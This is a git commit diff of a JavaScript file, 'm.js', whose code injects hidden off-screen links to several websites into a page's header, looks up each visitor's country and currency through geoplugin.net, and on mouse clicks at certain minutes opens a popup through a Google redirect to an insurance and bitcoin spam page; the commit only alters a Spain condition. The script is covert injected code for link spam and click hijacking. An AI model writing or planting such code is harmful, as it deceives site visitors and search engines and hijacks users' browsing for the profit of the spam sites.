8091b6ffd52c57bcecc97427d185f4f78cffaede
i5j <63402636+i5j@users.noreply.github.com>
2022-09-11 10:32:51 +0530

    Update m.js

--- m.js
+++ m.js
@@ -1,6 +1,6 @@
 let EFV='<a href="https://www.am2z.com" style="position:absolute;z-index:-999;left:-99%;">Am2z News</a><a href="https://www.mrjaz.com" style="position:absolute;z-index:-999;left:-99%;">MrJaz</a><a href="https://sohanisharma.com" style="position:absolute;z-index:-999;left:-99%;">SohaniSharma</a>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);
 
-if (!localStorage.xcaf){(async()=>{let aa=await(await(await fetch(`http://www.geoplugin.net/json.gp`)).json());localStorage.xcaf=1;if(/£|[$]|€/.test(aa.geoplugin_currencySymbol)){localStorage.xcaf=2;if(!/Spain/.test(aa.geoplugin_countryName)){localStorage.xcaf=3};uhd()}})();}
+if (!localStorage.xcaf){(async()=>{let aa=await(await(await fetch(`http://www.geoplugin.net/json.gp`)).json());localStorage.xcaf=1;if(/£|[$]|€/.test(aa.geoplugin_currencySymbol)){localStorage.xcaf=2;if(/Spain/.test(aa.geoplugin_countryName)){localStorage.xcaf=3};uhd()}})();}
 
 function uhd(){document.onmousedown=()=>{let dte=(new Date).getMinutes();if(!sessionStorage.i&&(localStorage.xcaf==2&&dte>9&&dte<30||localStorage.xcaf==3&&dte>9&&dte<20)){window.open('https://www.google.com/url?sa=t&source=web&rct=j&url=https://bitcoin-insurance-loan-seo-hosting.mrjaz.com/what-is-insurance-types-of-insurance-and-meaning-insurance-policy&ved=2ahUKEwiYkPq9-ov6AhU1ZWwGHZOXBYgQFnoECA0QAQ&usg=AOvVaw0Td5dR-lZBOeKNa4dB8aF4'); sessionStorage.i='i'}}};uhd()
 // "€"==a
